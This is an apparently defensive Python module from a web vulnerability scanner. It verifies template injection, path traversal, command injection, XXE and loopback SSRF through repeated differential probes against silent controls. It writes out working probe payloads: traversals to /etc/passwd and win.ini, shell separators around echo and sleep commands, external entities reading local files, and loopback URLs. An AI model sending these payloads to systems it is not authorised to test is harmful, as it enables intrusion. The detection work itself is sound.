"""Deterministic server-side injection verification over exact requests.

One differential core, four classes. Each class is a set of probes and one rule for what a
response must show:

* template injection: the product of two random numbers, written in a template expression, appears
  in the response; the same numbers without template syntax produce no product;
* path traversal: a traversal to a well-known file returns that file's signature; a traversal to a
  file that does not exist does not;
* command injection: a shell arithmetic expansion between two markers is echoed evaluated; or a
  one-second delay repeats over three control/payload pairs;
* XML external entity: an entity declared in an injected document type is expanded into the
  response, and an external entity returns a well-known file's signature;
* server-side request forgery: the application, given its own loopback address as a URL, returns
  content of its own front page that the unchanged request and a loopback URL of a missing page
  do not return. In-band only: nothing listens for a callback.

Nothing is promoted from one request. Every probe that hits is sent again with different random
values, and a control that carries the same characters without the syntax must stay silent, so an
endpoint that echoes or hashes its input cannot satisfy a contract. A response body is never kept:
an observation holds statuses, keyed digests and the name of the signature that matched.
"""

from __future__ import annotations

from dataclasses import replace
import hashlib
import math
import re
import time
from typing import Any, Awaitable, Callable, Mapping, Sequence
import urllib.parse

try:
    from capabilities.secret_material import keyed_body_digest
except ModuleNotFoundError:  # package import layout
    from api.capabilities.secret_material import keyed_body_digest

try:
    from capabilities.sqli_path_mutation import path_field_value, prepare_path_candidate
    from capabilities.sqli_proof import SQLiProofError, _field_value, _mutate
    from hunt.capability_executor import CapabilityAdapterResult, Cancelled, Heartbeat
    from runtime.auth_refusal import refusal_error, request_refusal
    from runtime.capability_registry import CapabilitySpec
    from runtime.models import TargetBinding
    from runtime.request_replay_executor import ReplayTransport, ReplayTransportResult
except ModuleNotFoundError:
    from .sqli_path_mutation import path_field_value, prepare_path_candidate
    from .sqli_proof import SQLiProofError, _field_value, _mutate
    from ..hunt.capability_executor import CapabilityAdapterResult, Cancelled, Heartbeat
    from ..runtime.auth_refusal import refusal_error, request_refusal
    from ..runtime.capability_registry import CapabilitySpec
    from ..runtime.models import TargetBinding
    from ..runtime.request_replay_executor import ReplayTransport, ReplayTransportResult

try:
    from scanner_tools.request_replay import ReplayRequest
except ModuleNotFoundError:
    from scanner.scanner_tools.request_replay import ReplayRequest


INJECTION_VERIFY_PARSER_VERSION = "injection-verify/v1"
INJECTION_CLASSES = (
    "template_injection", "path_traversal", "command_injection", "xxe", "ssrf",
)
PROOF_CONTRACTS = {
    "template_injection": "injection_template_differential/v1",
    "path_traversal": "injection_path_traversal_differential/v1",
    "command_injection": "injection_command_differential/v1",
    "command_injection_time": "injection_command_time_differential/v1",
    "xxe": "injection_xxe_differential/v1",
    "ssrf": "injection_ssrf_differential/v1",
}
# What a class needs before its first stage is worth starting (probes, the repeat, the control).
MINIMUM_REQUESTS = 4

# Template expression syntaxes, most common engines first: Jinja2/Twig/Nunjucks/Handlebars-like,
# Freemarker/Thymeleaf/EL/Mako, ERB/EJS, Ruby/Pug interpolation, Thymeleaf selection, Razor.
_TEMPLATE_SYNTAXES = (
    ("double_brace", "{{%d*%d}}"),
    ("dollar_brace", "${%d*%d}"),
    ("erb", "<%%= %d*%d %%>"),
    ("hash_brace", "#{%d*%d}"),
    ("star_brace", "*{%d*%d}"),
    ("razor", "@(%d*%d)"),
)
# (name, traversal). Each is sent as the whole value; the last two cover a filter that strips
# ``../`` once and an application that takes an absolute path or a URL.
_TRAVERSALS_UNIX = (
    ("dot_dot_slash", "../../../../../../../../etc/passwd"),
    ("nested_dot_dot", "....//....//....//....//....//....//....//....//etc/passwd"),
    ("absolute", "/etc/passwd"),
    ("file_url", "file:///etc/passwd"),
)
_TRAVERSALS_WINDOWS = (
    ("dot_dot_backslash", "..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini"),
)
# A file signature is structure, not a word: the account line of ``root`` and the section
# headers ``win.ini`` has carried since Windows 3.
_FILE_SIGNATURES = {
    "unix_passwd": re.compile(rb"root:[^:\n]{0,64}:0:0:[^:\n]{0,128}:/[^:\n]{0,128}:"),
    "windows_win_ini": re.compile(rb"(?is)\[fonts\].{0,400}\[extensions\]|; for 16-bit app support"),
}
# (name, wrapper). ``%s`` is the command. Separators a POSIX shell honours inside an unquoted
# argument, a double-quoted one and a single-quoted one.
_COMMAND_WRAPPERS = (
    ("semicolon", ";%s;"),
    ("pipe", "|%s"),
    ("substitution", "$(%s)"),
    ("backtick", "`%s`"),
    ("and", "&&%s"),
    ("double_quote_break", "\";%s;\""),
    ("single_quote_break", "';%s;'"),
)
# The separators ``cmd.exe`` honours. Its arithmetic is ``set /a``, which prints the result with
# no line break, so the marker that follows is joined to it.
_COMMAND_WRAPPERS_WINDOWS = (
    ("cmd_ampersand", "&%s&"),
    ("cmd_pipe", "|%s"),
)
_TIME_SCREEN_MS = 750
# Loopback spellings of the application's own address. A URL parameter that fetches any of them
# reaches an interface no outside client can.
_LOOPBACK_HOSTS = ("127.0.0.1", "localhost", "[::1]")
_SSRF_CHUNK_BYTES = 32
_SSRF_MINIMUM_PAGE_BYTES = 256
_XML_TYPES = ("application/xml", "text/xml", "+xml")


class InjectionVerifyError(ValueError):
    """An injection verification request does not match immutable candidate authority."""


def _content_type(request: ReplayRequest) -> str:
    for name, value in request.headers:
        if str(name).lower() == "content-type":
            return str(value).split(";", 1)[0].strip().lower()
    return ""


def _is_xml(request: ReplayRequest) -> bool:
    content_type = _content_type(request)
    return bool(request.body) and any(
        content_type == kind or content_type.endswith(kind) for kind in _XML_TYPES
    )


def _numbers(seed: str, label: str) -> tuple[int, int]:
    """Two five-digit factors, stable for one candidate, field and round.

    Stable so a retest sends what the Scan sent; five digits each so their product (nine or ten
    digits) and their sum cannot be read out of the request by an echoing endpoint.
    """
    digest = hashlib.sha256(f"{seed}:{label}".encode("utf-8")).digest()
    left = 10_007 + int.from_bytes(digest[:4], "big") % 79_999
    right = 10_009 + int.from_bytes(digest[4:8], "big") % 79_999
    return left, right


def _marker(seed: str, label: str) -> str:
    return "sk" + hashlib.sha256(f"{seed}:{label}".encode("utf-8")).hexdigest()[:10]


def _signature(body: bytes) -> str | None:
    window = body[:2_000_000]
    return next((name for name, pattern in _FILE_SIGNATURES.items() if pattern.search(window)), None)


def _contains(result: ReplayTransportResult, needle: str) -> bool:
    return needle.encode("utf-8") in result.response_body[:2_000_000]


def _pair(control: ReplayTransportResult, payload: ReplayTransportResult) -> dict[str, Any]:
    return {
        "control_status": control.status_code,
        "payload_status": payload.status_code,
        "control_response_sha256": keyed_body_digest(control.response_body),
        "payload_response_sha256": keyed_body_digest(payload.response_body),
    }


Send = Callable[[ReplayRequest], Awaitable[ReplayTransportResult]]


class InjectionVerifyAdapter:
    """Prove server-side injection with repeated differentials against a silent control."""

    capability_name = "injection.verify_batch"
    adapter_name = "injection.verify_batch"
    adapter_version = "1"
    manages_cancellation = True

    def __init__(
        self, *, specification: CapabilitySpec, target: TargetBinding,
        request: ReplayRequest, candidate: Mapping[str, Any],
        transport: ReplayTransport, requested_budget: Mapping[str, int],
        classes: Sequence[str] = INJECTION_CLASSES,
    ) -> None:
        if specification.name != "injection.verify_batch":
            raise InjectionVerifyError("injection verify capability is invalid")
        if int(requested_budget.get("http_requests") or 0) < MINIMUM_REQUESTS:
            raise InjectionVerifyError(
                f"injection verification requires at least {MINIMUM_REQUESTS} HTTP requests"
            )
        if str(candidate.get("method") or "").upper() != request.method:
            raise InjectionVerifyError("injection request method differs from candidate")
        request_ref = str(candidate.get("request_ref_id") or "")
        if request_ref and request_ref != request.request_id:
            raise InjectionVerifyError("injection private request reference differs")
        field = str(candidate.get("field_path") or candidate.get("parameter_name") or "")
        if not field:
            raise InjectionVerifyError("injection candidate has no exact field")
        unknown = [name for name in classes if name not in INJECTION_CLASSES]
        if unknown:
            raise InjectionVerifyError(f"unknown injection class: {unknown[0]}")
        self.specification = specification
        self.target = target
        try:
            self.request, self.path_index = prepare_path_candidate(request, candidate)
        except ValueError as exc:
            raise InjectionVerifyError(str(exc)) from exc
        self.candidate = dict(candidate)
        self.transport = transport
        self.requested_budget = {str(k): int(v) for k, v in requested_budget.items()}
        self.field = field
        self.classes = tuple(classes)
        self.writes = self.request.method not in {"GET", "HEAD", "OPTIONS"}
        self.seed = f"{self.candidate.get('candidate_id') or ''}:{field}"

    # -- request building -------------------------------------------------------------------

    def _with(self, value: str) -> ReplayRequest:
        try:
            return _mutate(self.request, self.field, value, path_index=self.path_index)
        except SQLiProofError as exc:
            raise InjectionVerifyError(str(exc)) from exc

    def _original(self) -> str:
        if self.path_index is not None:
            return path_field_value(self.request, self.path_index)
        return _field_value(self.request, self.field)

    def _spent(self, started: float, attempted: int) -> dict[str, int]:
        spent = {"http_requests": attempted}
        if "state_changing_requests" in self.requested_budget and self.writes:
            spent["state_changing_requests"] = attempted
        reserved = self.requested_budget.get("tool_wall_seconds")
        if reserved is not None:
            spent["tool_wall_seconds"] = min(
                max(1, int(reserved)), max(1, math.ceil(time.monotonic() - started)),
            )
        return spent

    def _observation(self, injection_class: str, **fields: Any) -> dict[str, Any]:
        verified = bool(fields.get("proof_contract"))
        return {
            "kind": "injection_proof",
            "injection_class": injection_class,
            # The route is value-free immutable manifest content, and a verified injection that
            # cannot say where it is is not actionable.
            "canonical_path": self.candidate.get("canonical_path"),
            "origin": self.request.origin(),
            "candidate_id": self.candidate.get("candidate_id"),
            "request_ref_id": self.candidate.get("request_ref_id"),
            "method": self.request.method,
            "field_path": self.field,
            "request_class": str(self.candidate.get("request_class") or "safe_read"),
            "proof_state": "verified" if verified else "not_proven",
            "finding_verdict": "verified" if verified else "not_proven",
            "proof_contract": None,
            "technique": None,
            "repetitions": 2 if verified else 0,
            "response_pairs": [],
            "secret_values_visible": False,
            **fields,
        }

    # -- classes ----------------------------------------------------------------------------

    async def _template_injection(
        self, send: Send, baseline: ReplayTransportResult, left: Callable[[], int],
    ) -> dict[str, Any]:
        first = _numbers(self.seed, "template:1")
        second = _numbers(self.seed, "template:2")
        products = (str(first[0] * first[1]), str(second[0] * second[1]))
        if any(_contains(baseline, product) for product in products):
            return self._observation("template_injection", inconclusive_reason="marker_in_baseline")
        for name, syntax in _TEMPLATE_SYNTAXES:
            # The probe, its repeat and the control.
            if left() < 3:
                break
            probe = await send(self._with(syntax % first))
            if probe.error_code or not _contains(probe, products[0]):
                continue
            repeat = await send(self._with(syntax % second))
            # The same factors and operator with no template syntax: an arithmetic evaluator (a
            # calculator, a spreadsheet cell) answers this too and is not template injection.
            control = await send(self._with("%d*%d" % first))
            if (
                not repeat.error_code and not control.error_code
                and _contains(repeat, products[1])
                and not _contains(control, products[0])
            ):
                return self._observation(
                    "template_injection",
                    proof_contract=PROOF_CONTRACTS["template_injection"],
                    technique=f"arithmetic_{name}_repeated",
                    payload_shape=syntax.replace("%d", "<n>").replace("%%", "%"),
                    response_pairs=[_pair(control, probe), _pair(control, repeat)],
                )
        return self._observation("template_injection")

    async def _path_traversal(
        self, send: Send, baseline: ReplayTransportResult, left: Callable[[], int],
    ) -> dict[str, Any]:
        if _signature(baseline.response_body) is not None:
            # The page already shows such a file (documentation, a tutorial): no differential.
            return self._observation("path_traversal", inconclusive_reason="marker_in_baseline")
        missing = _marker(self.seed, "missing")
        for name, traversal in (*_TRAVERSALS_UNIX, *_TRAVERSALS_WINDOWS):
            if left() < 3:
                break
            probe = await send(self._with(traversal))
            signature = None if probe.error_code else _signature(probe.response_body)
            if signature is None:
                continue
            repeat = await send(self._with(traversal))
            # The same traversal to a file that does not exist: an application that answers every
            # request with a page showing such a file is not reading the one that was named.
            leaf = "passwd" if "passwd" in traversal else "win.ini"
            control = await send(self._with(traversal.replace(leaf, missing)))
            if (
                not repeat.error_code and not control.error_code
                and _signature(repeat.response_body) == signature
                and _signature(control.response_body) is None
            ):
                return self._observation(
                    "path_traversal",
                    proof_contract=PROOF_CONTRACTS["path_traversal"],
                    technique=f"file_signature_{name}_repeated",
                    payload_shape=traversal, file_signature=signature,
                    response_pairs=[_pair(control, probe), _pair(control, repeat)],
                )
        return self._observation("path_traversal")

    async def _command_injection(
        self, send: Send, baseline: ReplayTransportResult, left: Callable[[], int],
    ) -> dict[str, Any]:
        original = self._original()
        marker = _marker(self.seed, "command")
        first = _numbers(self.seed, "command:1")
        second = _numbers(self.seed, "command:2")
        echoed = tuple(f"{marker}{pair[0] + pair[1]}{marker}" for pair in (first, second))
        if any(_contains(baseline, value) for value in echoed):
            return self._observation("command_injection", inconclusive_reason="marker_in_baseline")

        def command(pair: tuple[int, int]) -> str:
            return f"echo {marker}$(({pair[0]}+{pair[1]})){marker}"

        for name, wrapper in _COMMAND_WRAPPERS:
            if left() < 3:
                break
            probe = await send(self._with(original + wrapper % command(first)))
            if probe.error_code or not _contains(probe, echoed[0]):
                continue
            repeat = await send(self._with(original + wrapper % command(second)))
            # The same text with no shell syntax around it: nothing may evaluate it.
            control = await send(self._with(original + command(first).replace("$((", "((")))
            if (
                not repeat.error_code and not control.error_code
                and _contains(repeat, echoed[1]) and not _contains(control, echoed[0])
            ):
                return self._observation(
                    "command_injection",
                    proof_contract=PROOF_CONTRACTS["command_injection"],
                    technique=f"arithmetic_echo_{name}_repeated",
                    payload_shape="<original>" + wrapper % "echo <marker>$((<n>+<n>))<marker>",
                    response_pairs=[_pair(control, probe), _pair(control, repeat)],
                )
        # Windows: ``set /a`` prints the sum and ``echo`` the marker right after it.
        joined = tuple(f"{pair[0] + pair[1]}{marker}" for pair in (first, second))

        def windows_command(pair: tuple[int, int]) -> str:
            return f"set /a {pair[0]}+{pair[1]}&echo {marker}"

        for name, wrapper in _COMMAND_WRAPPERS_WINDOWS:
            if left() < 3 or any(_contains(baseline, value) for value in joined):
                break
            probe = await send(self._with(original + wrapper % windows_command(first)))
            if probe.error_code or not _contains(probe, joined[0]):
                continue
            repeat = await send(self._with(original + wrapper % windows_command(second)))
            # The same words with no separator before them: nothing may run them.
            control = await send(self._with(original + windows_command(first).replace("&", " ")))
            if (
                not repeat.error_code and not control.error_code
                and _contains(repeat, joined[1]) and not _contains(control, joined[0])
            ):
                return self._observation(
                    "command_injection",
                    proof_contract=PROOF_CONTRACTS["command_injection"],
                    technique=f"arithmetic_echo_{name}_repeated",
                    payload_shape="<original>" + wrapper % "set /a <n>+<n>&echo <marker>",
                    response_pairs=[_pair(control, probe), _pair(control, repeat)],
                )
        # Blind: nothing is echoed, so the only signal is time. One screening request per wrapper;
        # a wrapper that delays is confirmed over three control/payload pairs, as SQL injection is.
        quiet_ms = baseline.elapsed_ms
        for name, wrapper in _COMMAND_WRAPPERS:
            if left() < 7:
                break
            delayed = self._with(original + wrapper % "sleep 1")
            screen = await send(delayed)
            if screen.error_code or screen.elapsed_ms - quiet_ms < _TIME_SCREEN_MS:
                continue
            control_request = self._with(original)
            pairs = [(await send(control_request), await send(delayed)) for _ in range(3)]
            control_ms = sorted(pair[0].elapsed_ms for pair in pairs)
            payload_ms = sorted(pair[1].elapsed_ms for pair in pairs)
            if (
                all(not control.error_code and not payload.error_code for control, payload in pairs)
                and payload_ms[1] - control_ms[1] >= 750
                and payload_ms[0] - control_ms[2] >= 500
            ):
                return self._observation(
                    "command_injection",
                    proof_contract=PROOF_CONTRACTS["command_injection_time"],
                    technique=f"time_median_{name}_repeated",
                    payload_shape="<original>" + wrapper % "sleep 1", repetitions=3,
                    timing_ms={"control_median": control_ms[1], "payload_median": payload_ms[1]},
                    response_pairs=[_pair(control, payload) for control, payload in pairs],
                )
            break  # one confirmation per candidate: a slow route is not retried per wrapper
        return self._observation("command_injection")

    async def _xxe(
        self, send: Send, baseline: ReplayTransportResult, left: Callable[[], int],
    ) -> dict[str, Any]:
        try:
            document = self.request.body.decode("utf-8")
        except (UnicodeDecodeError, AttributeError):
            return self._observation("xxe", inconclusive_reason="body_not_text")
        declaration = re.match(r"\s*<\?xml.*?\?>", document, flags=re.S)
        prolog = declaration.group(0) if declaration else ""
        # The document without its prolog and without a document type of its own.
        body = re.sub(r"(?s)<!DOCTYPE[^>\[]*(\[.*?\])?\s*>", "", document[len(prolog):], count=1)
        root = re.search(r"<([A-Za-z_][\w.\-]*(?::[\w.\-]+)?)[\s>/]", re.sub(r"(?s)<!--.*?-->", "", body))
        text_node = re.search(r">([^<>&]{1,200})</", body)
        if root is None or text_node is None or left() < 4:
            return self._observation("xxe", inconclusive_reason="no_text_node")
        if _signature(baseline.response_body) is not None:
            return self._observation("xxe", inconclusive_reason="marker_in_baseline")
        text_start, text_end = text_node.span(1)

        def with_entity(definition: str) -> ReplayRequest:
            injected = (
                f"{prolog}<!DOCTYPE {root.group(1)} [{definition}]>"
                + body[:text_start] + "&skx;" + body[text_end:]
            )
            return replace(self.request, body=injected.encode("utf-8"))

        left_half, right_half = _marker(self.seed, "xxe:a"), _marker(self.seed, "xxe:b")
        expanded = left_half + right_half
        # Internal entities first: the joined value appears nowhere in the request, so only a
        # parser that expands entities can return it. Without that, an external entity cannot work.
        internal = await send(with_entity(
            f'<!ENTITY ska "{left_half}"><!ENTITY skb "{right_half}"><!ENTITY skx "&ska;&skb;">'
        ))
        if internal.error_code or not _contains(internal, expanded):
            return self._observation("xxe")
        for name, system in (("unix_passwd", "file:///etc/passwd"),
                             ("windows_win_ini", "file:///c:/windows/win.ini")):
            if left() < 3:
                break
            probe = await send(with_entity(f'<!ENTITY skx SYSTEM "{system}">'))
            signature = None if probe.error_code else _signature(probe.response_body)
            if signature is None:
                continue
            repeat = await send(with_entity(f'<!ENTITY skx SYSTEM "{system}">'))
            missing = system.rsplit("/", 1)[0] + "/" + _marker(self.seed, "xxe:missing")
            control = await send(with_entity(f'<!ENTITY skx SYSTEM "{missing}">'))
            if (
                not repeat.error_code and not control.error_code
                and _signature(repeat.response_body) == signature
                and _signature(control.response_body) is None
            ):
                return self._observation(
                    "xxe", proof_contract=PROOF_CONTRACTS["xxe"],
                    technique="external_entity_file_signature_repeated",
                    payload_shape=f'<!ENTITY x SYSTEM "{system}">', file_signature=name,
                    response_pairs=[_pair(control, probe), _pair(control, repeat)],
                )
        # Entities expand but no file came back (the parser forbids external ones, or the element
        # is not reflected): reported as what was observed, never as the vulnerability.
        return self._observation("xxe", internal_entities_expanded=True)

    async def _ssrf(
        self, send: Send, baseline: ReplayTransportResult, left: Callable[[], int],
    ) -> dict[str, Any]:
        """Does the application fetch its own loopback address when the field names it?

        The front page and a page that does not exist are read directly first. Chunks of the
        front page that are in neither the missing page nor the unchanged request's answer are
        the signal: they can only reach a response through a fetch of the front page.
        """
        if self.request.method != "GET":
            # The two reference pages are read with the candidate's own request shape; a write
            # is not repeated for them.
            return self._observation("ssrf", inconclusive_reason="not_a_read")
        if left() < 6:
            return self._observation("ssrf")
        parts = urllib.parse.urlsplit(self.request.url)
        port = parts.port or (443 if parts.scheme == "https" else 80)
        missing = "/" + _marker(self.seed, "ssrf:missing")
        front = await send(replace(
            self.request, url=urllib.parse.urlunsplit((parts.scheme, parts.netloc, "/", "", "")),
        ))
        absent = await send(replace(
            self.request, url=urllib.parse.urlunsplit((parts.scheme, parts.netloc, missing, "", "")),
        ))
        if (
            front.error_code or absent.error_code
            or len(front.response_body) < _SSRF_MINIMUM_PAGE_BYTES
        ):
            return self._observation("ssrf", inconclusive_reason="no_reference_page")
        page = front.response_body[:200_000]
        chunks = [
            page[offset:offset + _SSRF_CHUNK_BYTES]
            for offset in range(0, len(page) - _SSRF_CHUNK_BYTES + 1, _SSRF_CHUNK_BYTES)
        ]
        chunks = [
            chunk for chunk in chunks
            if chunk not in absent.response_body and chunk not in baseline.response_body
        ][:64]
        if len(chunks) < 3:
            return self._observation("ssrf", inconclusive_reason="marker_in_baseline")

        def shown(result: ReplayTransportResult) -> int:
            return sum(chunk in result.response_body for chunk in chunks)

        for host in _LOOPBACK_HOSTS:
            if left() < 3:
                break
            for scheme in dict.fromkeys((parts.scheme, "http")):
                if left() < 3:
                    break
                loopback = f"{scheme}://{host}:{port}"
                probe = await send(self._with(loopback + "/"))
                if probe.error_code or shown(probe) < 3:
                    continue
                repeat = await send(self._with(loopback + "/"))
                # The same address, a page that does not exist: an application that answers any
                # URL with its front page (a catch-all route) is not fetching what was named.
                control = await send(self._with(loopback + missing))
                if (
                    not repeat.error_code and not control.error_code
                    and shown(repeat) >= 3 and shown(control) == 0
                ):
                    return self._observation(
                        "ssrf", proof_contract=PROOF_CONTRACTS["ssrf"],
                        technique="loopback_front_page_repeated",
                        payload_shape=f"{scheme}://{host}:<port>/",
                        response_pairs=[_pair(control, probe), _pair(control, repeat)],
                    )
        return self._observation("ssrf")

    # -- execution --------------------------------------------------------------------------

    async def execute(self, *, heartbeat: Heartbeat, cancelled: Cancelled) -> CapabilityAdapterResult:
        started = time.monotonic()
        attempted = 0
        results: list[ReplayTransportResult] = []
        budget = self.requested_budget["http_requests"]

        def left() -> int:
            return budget - attempted

        async def send(request: ReplayRequest) -> ReplayTransportResult:
            nonlocal attempted
            if cancelled():
                raise InjectionVerifyError("cancelled")
            if attempted >= budget:
                raise InjectionVerifyError("budget_exhausted")
            wall = max(1, int(self.requested_budget.get("tool_wall_seconds") or 1))
            # Split the wall that is left, not the whole reservation (as sqli_proof does).
            wall_left = wall - (time.monotonic() - started)
            if "tool_wall_seconds" in self.requested_budget and wall_left < 0.5:
                raise InjectionVerifyError("deadline")
            remaining = max(1, budget - attempted)
            # Counted before it is sent: a request cut off in flight still reached the target.
            attempted += 1
            result = await self.transport.send(
                request, target=self.target,
                timeout_seconds=max(0.5, min(15.0, wall_left / remaining)),
                follow_redirects=False,
            )
            results.append(result)
            await heartbeat()
            return result

        request_class = str(self.candidate.get("request_class") or "safe_read")
        observations: list[Mapping[str, Any]] = []
        refused: tuple[int, str] | None = None
        completed: list[str] = []
        stages = {
            "template_injection": self._template_injection,
            "path_traversal": self._path_traversal,
            "command_injection": self._command_injection,
            "xxe": self._xxe,
            "ssrf": self._ssrf,
        }
        try:
            baseline = await send(self.request)
            refused = request_refusal(
                baseline.status_code, baseline.response_headers,
                request_class=request_class, url=self.request.url, body=self.request.body,
            )
            if refused is None and not baseline.error_code:
                for name in self.classes:
                    if name == "xxe" and not _is_xml(self.request):
                        continue
                    if left() < 3:
                        break
                    observations.append(await stages[name](send, baseline, left))
                    completed.append(name)
        except InjectionVerifyError as exc:
            reason = str(exc)
            timed_out = reason == "deadline"
            status = (
                "cancelled" if reason == "cancelled"
                else "partial" if timed_out or observations else "blocked"
            )
            return CapabilityAdapterResult(
                status=status, observations=tuple(observations), errors=(reason,),
                execution_started=bool(attempted), timed_out=timed_out,
                actual_budget=self._spent(started, attempted),
                partial=bool(attempted) or timed_out,
                parser_version=INJECTION_VERIFY_PARSER_VERSION,
            )

        verified = [item for item in observations if item.get("proof_state") == "verified"]
        errors = tuple(item.error_code for item in results if item.error_code)
        if refused is not None:
            # The target refused the unchanged request: no probe was compared with an answer.
            observations.append(self._observation(
                self.classes[0] if self.classes else "template_injection",
                finding_verdict="inconclusive", inconclusive_reason=refused[1],
                control_status=baseline.status_code,
            ))
            errors = (refusal_error(*refused), *errors)
        applicable = [
            name for name in self.classes if name != "xxe" or _is_xml(self.request)
        ]
        classes_exhausted = refused is None and not errors and len(completed) < len(applicable)
        return CapabilityAdapterResult(
            status="partial" if errors or classes_exhausted else "success",
            observations=tuple(observations), errors=errors,
            actual_budget=self._spent(started, attempted),
            partial=bool(errors or classes_exhausted),
            timed_out=any(item.timed_out for item in results),
            execution_started=True, parser_version=INJECTION_VERIFY_PARSER_VERSION,
            redacted_execution={
                "candidate_id": self.candidate.get("candidate_id"),
                "request_ref_id": self.candidate.get("request_ref_id"),
                "method": self.request.method, "field_path": self.field,
                "classes": completed,
                "proof_contract": verified[0].get("proof_contract") if verified else None,
                "secret_values_visible": False,
            },
        )


__all__ = [
    "INJECTION_CLASSES", "INJECTION_VERIFY_PARSER_VERSION", "InjectionVerifyAdapter",
    "InjectionVerifyError", "MINIMUM_REQUESTS", "PROOF_CONTRACTS",
]
